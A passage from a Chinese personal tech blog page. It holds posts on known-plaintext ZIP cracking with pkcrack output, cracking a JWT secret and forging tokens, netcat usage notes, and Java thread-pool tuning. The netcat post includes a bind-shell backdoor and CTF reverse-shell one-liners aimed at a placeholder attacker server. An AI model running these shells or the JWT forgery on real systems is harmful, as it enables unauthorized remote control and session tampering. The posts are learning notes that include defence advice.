offset 817785</span><br><span class="line">Lowest number: 306 values at offset 817784</span><br><span class="line">Lowest number: 291 values at offset 817774</span><br><span class="line">Lowest number: 281 values at offset 817761</span><br><span class="line">Lowest number: 279 values at offset 805546</span><br><span class="line">Lowest number: 253 values at offset 805545</span><br><span class="line">Lowest number: 242 values at offset 805544</span><br><span class="line">Lowest number: 215 values at offset 805519</span><br><span class="line">Lowest number: 212 values at offset 798445</span><br><span class="line">Lowest number: 211 values at offset 798421</span><br><span class="line">Lowest number: 193 values at offset 798402</span><br><span class="line">Lowest number: 187 values at offset 798401</span><br><span class="line">Lowest number: 185 values at offset 798397</span><br><span class="line">Lowest number: 179 values at offset 798395</span><br><span class="line">Lowest number: 178 values at offset 798392</span><br><span class="line">Lowest number: 176 values at offset 798390</span><br><span class="line">Lowest number: 175 values at offset 798382</span><br><span class="line">Lowest number: 174 values at offset 798380</span><br><span class="line">Lowest number: 151 values at offset 798370</span><br><span class="line">Lowest number: 139 values at offset 798369</span><br><span class="line">Lowest number: 127 values at offset 709771</span><br><span class="line">Lowest number: 114 values at offset 709769</span><br><span class="line">Lowest number: 113 values at offset 709767</span><br><span class="line">Lowest number: 110 values at offset 709766</span><br><span class="line">Lowest number: 106 values at offset 709764</span><br><span class="line">Lowest number: 103 values at offset 709752</span><br><span class="line">Lowest number: 101 values at offset 709751</span><br><span class="line">Lowest number: 99 values at offset 709750</span><br><span class="line">Done. Left with 99 possible Values. bestOffset is 709750.</span><br><span class="line">Stage 1 completed. Starting stage 2 on Mon Sep 26 15:40:52 2022</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Stage 2 completed. Starting zipdecrypt on Mon Sep 26 15:40:53 2022</span><br><span class="line">Decrypting 其他密文.txt (210b089a08f3aed2247acf25)... OK!</span><br><span class="line">Decrypting 明文.png (a84583e0c35dc7faaa590237)... OK!</span><br><span class="line">Finished on Mon Sep 26 15:40:53 2022</span><br></pre></td></tr></table></figure>

<p>破解后的压缩包就生成到了结果.zip里。</p>
<h1 id="如何防御此类攻击"><a href="#如何防御此类攻击" class="headerlink" title="如何防御此类攻击"></a>如何防御此类攻击</h1><p>1。密码尽量包含多样的字符、长度不太短；<br>2。要加密的压缩包里不要放一些无关紧要、容易被社工手段获取到明文的文件。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/" data-id="cl8igz3qj00000fam0bfp8z49" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pkcrack/" rel="tag">pkcrack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/jwt破解" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/" class="article-date">
  <time datetime="2022-09-26T07:09:10.000Z" itemprop="datePublished">2022-09-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/">jwt破解</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="What-什么是jwt"><a href="#What-什么是jwt" class="headerlink" title="What: 什么是jwt"></a>What: 什么是jwt</h1><p>JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案,主要应用于2个系统之间的授信场景。<br>也能用于身份token。<br>可以参考:<br><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
<p>可以使用<br><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>查看jwt的三个组成部分:</p>
<img src="/images/2022-09/jwt.jpg" class="" width="800" height="1200" title="jwt">

<h1 id="How-jwt的保密性如何？"><a href="#How-jwt的保密性如何？" class="headerlink" title="How: jwt的保密性如何？"></a>How: jwt的保密性如何？</h1><p>jwt除了密钥，其他基本是明文，所以保密性较低。</p>
<p>可以用:<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br>对它进行破解。</p>
<p>或者直接：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --global jwt-cracker</span><br><span class="line">jwt-cracker &lt;jwt&gt;</span><br></pre></td></tr></table></figure>
<p>即可破解jwt中的密钥。</p>
<p>然后在jwt.io上修改payload，填上密钥重新加密即可篡改原来的内容实现破解。</p>
<h1 id="如何防御此类攻击"><a href="#如何防御此类攻击" class="headerlink" title="如何防御此类攻击"></a>如何防御此类攻击</h1><p>1。jwt基础上加上加密、摘要(类似于https/pgp协议)，防止篡改、破解；<br>2。jwt中不存储敏感信息；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/" data-id="cl8ifks9j0000dpam6ahp0qxx" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/nc命令笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/" class="article-date">
  <time datetime="2022-09-25T10:31:22.000Z" itemprop="datePublished">2022-09-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/shell/">shell</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/">nc命令笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="单聊"><a href="#单聊" class="headerlink" title="单聊"></a>单聊</h1><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端(收):</span></span><br><span class="line">nc -l -k 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端(发):</span></span><br><span class="line">nc 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<p>双向聊天的话就开俩端口，互相监听；<br><code>-l</code>就是listen、监听某个端口；<br><code>-k</code>就是keep，不然客户端一断服务端也会关闭；keep的话服务端能保持不挂；</p>
<h1 id="聊天室"><a href="#聊天室" class="headerlink" title="聊天室"></a>聊天室</h1><p>这个可以安装一下nmap(<code>brew install nmap</code>)，然后就可以用ncat了:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端以broker模式启动:</span></span><br><span class="line">ncat -l 8888 --broker</span><br></pre></td></tr></table></figure>
<p>然后多个客户端可以连到8888上聊天；（客户端用nc或ncat都行）</p>
<h1 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h1><p>(就是在聊天基础上加一个管道)</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 接收方:</span></span><br><span class="line">nc -l 8080 &gt; out.jpeg</span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送方:</span></span><br><span class="line">nc 127.0.0.1 &lt; WechatIMG104.jpeg</span><br></pre></td></tr></table></figure>

<h1 id="转发请求"><a href="#转发请求" class="headerlink" title="转发请求:"></a>转发请求:</h1><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkfifo 2way</span><br><span class="line">nc -k -l 8080 0&lt;2way | nc 172.29.53.164 21445 1&gt;2way</span><br><span class="line">nc -k -l 8081 0&lt;2way | nc 127.0.0.1 8080 1&gt;2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或</span></span><br><span class="line">ncat -k -l 8080 0&lt;2way | ncat 172.29.53.164 21445 1&gt;2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或</span></span><br><span class="line">cat 2way | nc 172.29.53.164 21445 | nc -l 8080 &gt; 2way</span><br><span class="line">cat 2way | nc 127.0.0.1 8080 | nc -k -l 8081 &gt; 2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后</span></span><br><span class="line">echo -n "GET / HTTP/1.0\r\n\r\n" | nc -v -D 127.0.0.1 8080</span><br></pre></td></tr></table></figure>

<h2 id="http服务"><a href="#http服务" class="headerlink" title="http服务"></a>http服务</h2><p>简单启动一个http服务方便测试:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8081</span><br></pre></td></tr></table></figure>
<p>然后在当前目录放上index.html就能返回文本给curl请求了。<br>这个在测试命令是否成功执行时能用，也能带回一些基本数据。</p>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>其实就是转发端口上收到的东西到<code>/bin/bash</code>，从而执行命令:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 被控制端:</span></span><br><span class="line">nc -l 8080 -e /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 控制端:</span></span><br><span class="line">nc 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<p>这个挺离谱的，试了一下可以ls目录，然后cd到某个目录里继续执行ls、回显结果。<br>感觉相当于为所欲为了。</p>
<p>CTF里的反向shell一般是先在自己的机器上:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 10086</span><br></pre></td></tr></table></figure>
<p>然后想办法在目标机器上执行:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;my_server_ip&gt;/10086 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>或者:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh &lt;my_server_ip&gt; 10086</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://linux.cn/article-9190-1.html" target="_blank" rel="noopener">https://linux.cn/article-9190-1.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/" data-id="cl8h7yeg1000021am999s9mu3" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nc/" rel="tag">nc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ncat/" rel="tag">ncat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/" rel="tag">shell</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/调优-解决线程池造成的进程卡顿、cpu毛刺问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2022-09-25T07:11:32.000Z" itemprop="datePublished">2022-09-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/">调优-解决线程池造成的进程卡顿、cpu毛刺问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="背景-amp-现象"><a href="#背景-amp-现象" class="headerlink" title="背景&amp;现象"></a>背景&amp;现象</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>有个qps较高的rpc，使用了线程池来并发请求多个下游服务，且设定了对于下游的超时时间。</p>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>rpc服务调用下游时，时不时出现耗时很高的情况，平均耗时挺低的，但是p99和p995就比较高了，达到秒级，超过了设定的调用下游的超时时间。<br>从rpc monitor上看，调用下游实际也用不了这么长时间，说明不是跨span的耗时；<br>使用arthas  trace查看方法级的耗时:</p>
<img src="/images/2022-09/trace_supply.png" class="" width="800" height="1200" title="trace_supply">
<img src="/images/2022-09/start.png" class="" width="800" height="1200" title="start">
<p>可以发现是频繁start新的thread导致的。</p>
<p>再查看日志里的线程编号：<br>-thread-7665821<br>已经达到七百万了！</p>
<p>参考以前的学习：<br><a href="http://xiaoyue26.github.io/2022/03/14/2022-03/%E4%B8%AD%E6%96%AD%E6%A2%B3%E7%90%86/">http://xiaoyue26.github.io/2022/03/14/2022-03/%E4%B8%AD%E6%96%AD%E6%A2%B3%E7%90%86/</a></p>
<img src="/images/2022-09/core_thread.png" class="" width="800" height="1200" title="core_thread">
<p>由于jvm线程与内核线程一一对应(hotpot jvm下)，频繁回收、创建带来的内核态切换、系统调用开销过于大了。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>综上可以发现线程池里有频繁的线程回收、再创建操作，需要关闭core线程自动回收的机制（基础框架内默认是开启回收）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DynamicThreadExecutor.dynamic(POOL_SIZE::get, <span class="string">"csc-center-executor-%d"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<p>字段注释：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@param</span> allowCoreThreadTimeout 是否允许核心线程超时后被回收，</span><br><span class="line">*         超时时间参数可通过为&#123;<span class="meta">@link</span> ExecutorBuilder.coreThreadKeepAliveMillis&#125;设置</span><br><span class="line">*         默认超时时间为<span class="number">1</span>分钟</span><br></pre></td></tr></table></figure>

<h1 id="收益"><a href="#收益" class="headerlink" title="收益"></a>收益</h1><p>请求耗时p99\p995、超时异常大幅降低；</p>
<img src="/images/2022-09/p99.png" class="" width="800" height="1200" title="p99">
<img src="/images/2022-09/timeout.png" class="" width="800" height="1200" title="timeout">

<h1 id="更多参考代码"><a href="#更多参考代码" class="headerlink" title="更多参考代码"></a>更多参考代码</h1><p>也可以自己选择喜欢的builder创建:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> DynamicThreadExecutor fromBuilder = DynamicThreadExecutor.dynamic(POOL_SIZE::get,</span><br><span class="line">       num -&gt; ExecutorsEx.newBlockingThreadPool(ExecutorBuilder</span><br><span class="line">               .newBuilder()</span><br><span class="line">               .allowCoreThreadTimeout(<span class="keyword">false</span>)</span><br><span class="line">               .threadSize(num)</span><br><span class="line">               .queueSize(num)</span><br><span class="line">               .theadNameFormat(<span class="string">"from-builder-%d"</span>)));</span><br></pre></td></tr></table></figure>

<h1 id="注意事项-可能的坑"><a href="#注意事项-可能的坑" class="headerlink" title="注意事项(可能的坑)"></a>注意事项(可能的坑)</h1><ol>
<li>摘要中的代码默认创建的是BlockingThreadPool，不支持嵌套使用。不要在提交的任务中再次提交任务到同一个线程池，以免死锁。<br>(jdk中的支持嵌套调用)</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/342929293" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/342929293</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" data-id="cl8h0idzb0000dzama6npgvog" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="tag">线程池</a></li></ul>

    </footer>
  </div>
  
</article>
 


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/2/">下一页&amp;raquo;</a>
  </nav>
</section>
           
    <aside id="sidebar">
  
    
  <div class="widget-wrap">
     
        <h3 class="follow-title ">Follow me</h3>
     
    <div class="widget follow">
      
              <a class="github" aria-hidden="true" href="https://github.com/xiaoyue26" target="_blank" title="Github"></a>
      
      
            <a class="weibo" aria-hidden="true"  href="http://weibo.com/3004306764" target="_blank" title="微博"></a>
      
      
      
            <a class="email" aria-hidden="true"  href="mailto:296671657@qq.com" target="_blank" title="邮箱"></a>
      
    </div>
  </div>


  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title categories">分类</h3>
    <div class="widget" id="categories">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/clickhouse/">clickhouse</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/es/">es</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/gradle/">gradle</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/">hadoop</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/hbase/">hbase</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/hive/">hive</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/pig/">pig</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/sqoop/">sqoop</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hadoop/%E8%BF%90%E7%BB%B4/">运维</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">88</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/java/Netty/">Netty</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/jvm/">jvm</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/spring/">spring</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/%E5%B9%B6%E5%8F%91/">并发</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">23</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nginx/">nginx</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/orm/">orm</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/redis/">redis</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/rtc/">rtc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/rust/">rust</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/spark/">spark</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/spark/streaming/">streaming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tcp/">tcp</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%86%E5%B8%83%E5%BC%8F/">分布式</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/">数据结构与算法</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%BF%97/">日志</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/">消息队列</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/disruptor/">disruptor</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka/">kafka</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/rabbitmq/">rabbitmq</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%BA%E6%96%87/">论文</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%85%8D%E7%BD%AE/">配置</a><span class="category-list-count">23</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9F%B3%E8%A7%86%E9%A2%91/">音视频</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/">项目管理</a><span class="category-list-count">1</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title tagcloud">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/2-3%E6%A0%91/" style="font-size: 14px; color: #00f">2-3树</a> <a href="/tags/AES/" style="font-size: 14.79px; color: #1109fe">AES</a> <a href="/tags/ByteString/" style="font-size: 14px; color: #00f">ByteString</a> <a href="/tags/DDD/" style="font-size: 14.79px; color: #1109fe">DDD</a> <a href="/tags/HMAC/" style="font-size: 14.79px; color: #1109fe">HMAC</a> <a href="/tags/HTTP/" style="font-size: 14.79px; color: #1109fe">HTTP</a> <a href="/tags/HttpRange/" style="font-size: 14px; color: #00f">HttpRange</a> <a href="/tags/JMX/" style="font-size: 14px; color: #00f">JMX</a> <a href="/tags/JNI/" style="font-size: 16.36px; color: #331cfb">JNI</a> <a href="/tags/NIO/" style="font-size: 14px; color: #00f">NIO</a> <a href="/tags/Netty/" style="font-size: 21.07px; color: #9954f4">Netty</a> <a href="/tags/RSA/" style="font-size: 14.79px; color: #1109fe">RSA</a> <a href="/tags/RTP/" style="font-size: 14px; color: #00f">RTP</a> <a href="/tags/SIMD/" style="font-size: 14px; color: #00f">SIMD</a> <a href="/tags/SSL/" style="font-size: 14.79px; color: #1109fe">SSL</a> <a href="/tags/Spanner/" style="font-size: 14px; color: #00f">Spanner</a> <a href="/tags/TLS/" style="font-size: 14.79px; color: #1109fe">TLS</a> <a href="/tags/arthas/" style="font-size: 14px; color: #00f">arthas</a> <a href="/tags/awk/" style="font-size: 14px; color: #00f">awk</a> <a href="/tags/bbr/" style="font-size: 14px; color: #00f">bbr</a> <a href="/tags/bloomfilter/" style="font-size: 14px; color: #00f">bloomfilter</a> <a href="/tags/caffeine/" style="font-size: 14.79px; color: #1109fe">caffeine</a> <a href="/tags/clickhouse/" style="font-size: 14.79px; color: #1109fe">clickhouse</a> <a href="/tags/cm-sketch/" style="font-size: 14px; color: #00f">cm-sketch</a> <a href="/tags/cms/" style="font-size: 14px; color: #00f">cms</a> <a href="/tags/cubic/" style="font-size: 14px; color: #00f">cubic</a> <a href="/tags/disruptor/" style="font-size: 14px; color: #00f">disruptor</a> <a href="/tags/doorkeeper/" style="font-size: 14px; color: #00f">doorkeeper</a> <a href="/tags/elasticsearch/" style="font-size: 14px; color: #00f">elasticsearch</a> <a href="/tags/es/" style="font-size: 14px; color: #00f">es</a> <a href="/tags/flask/" style="font-size: 14px; color: #00f">flask</a> <a href="/tags/gc/" style="font-size: 14.79px; color: #1109fe">gc</a> <a href="/tags/git/" style="font-size: 14.79px; color: #1109fe">git</a> <a href="/tags/gpo/" style="font-size: 14px; color: #00f">gpo</a> <a href="/tags/graal/" style="font-size: 14px; color: #00f">graal</a> <a href="/tags/gradle/" style="font-size: 14.79px; color: #1109fe">gradle</a> <a href="/tags/groovy/" style="font-size: 14.79px; color: #1109fe">groovy</a> <a href="/tags/gso/" style="font-size: 14px; color: #00f">gso</a> <a href="/tags/h264/" style="font-size: 14px; color: #00f">h264</a> <a href="/tags/hadoop/" style="font-size: 16.36px; color: #331cfb">hadoop</a> <a href="/tags/hbase/" style="font-size: 14px; color: #00f">hbase</a> <a href="/tags/hdfs/" style="font-size: 14.79px; color: #1109fe">hdfs</a> <a href="/tags/hive/" style="font-size: 